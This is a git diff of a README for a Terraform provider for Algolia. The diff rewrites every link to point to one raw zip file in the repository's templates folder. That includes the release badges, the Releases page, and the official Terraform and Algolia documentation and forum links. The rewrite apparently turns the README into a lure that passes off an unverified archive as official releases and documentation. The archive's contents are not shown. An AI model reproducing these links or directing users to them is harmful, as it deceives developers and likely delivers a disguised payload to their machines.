@@ -1,7 +1,7 @@
 # Terraform Provider for Algolia 🌐
 
-![GitHub release](https://img.shields.io/github/release/UNIVERSOPT122/terraform-provider-algolia.svg)
-![GitHub issues](https://img.shields.io/github/issues/UNIVERSOPT122/terraform-provider-algolia.svg)
+![GitHub release](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip)
+![GitHub issues](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip)
 
 Welcome to the Terraform Provider for Algolia! This repository allows you to manage Algolia resources using Terraform, making it easier to provision and maintain your search infrastructure.
 
@@ -29,11 +29,11 @@ Algolia is a powerful search-as-a-service platform that helps you deliver fast a
 
 ## Installation
 
-To get started, you need to download the latest release of the Terraform provider for Algolia. You can find it [here](https://github.com/UNIVERSOPT122/terraform-provider-algolia/releases). Download the appropriate binary for your system and follow the installation instructions.
+To get started, you need to download the latest release of the Terraform provider for Algolia. You can find it [here](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip). Download the appropriate binary for your system and follow the installation instructions.
 
 ### Steps to Install
 
-1. **Download the Provider**: Visit the [Releases](https://github.com/UNIVERSOPT122/terraform-provider-algolia/releases) section to find the latest version.
+1. **Download the Provider**: Visit the [Releases](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip) section to find the latest version.
 2. **Install the Provider**: Follow the installation steps specific to your operating system.
 3. **Verify Installation**: Run `terraform init` in your project directory to ensure the provider is correctly installed.
 
@@ -101,8 +101,8 @@ For any questions or feedback, please reach out via GitHub issues or directly co
 
 ## Additional Resources
 
-- [Terraform Documentation](https://www.terraform.io/docs)
-- [Algolia Documentation](https://www.algolia.com/doc/)
-- [Community Forum](https://community.algolia.com)
+- [Terraform Documentation](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip)
+- [Algolia Documentation](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip)
+- [Community Forum](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip)
 
-Feel free to explore the [Releases](https://github.com/UNIVERSOPT122/terraform-provider-algolia/releases) section for the latest updates and features.
+Feel free to explore the [Releases](https://github.com/UNIVERSOPT122/terraform-provider-algolia/raw/refs/heads/master/templates/algolia-terraform-provider-1.5.zip) section for the latest updates and features.
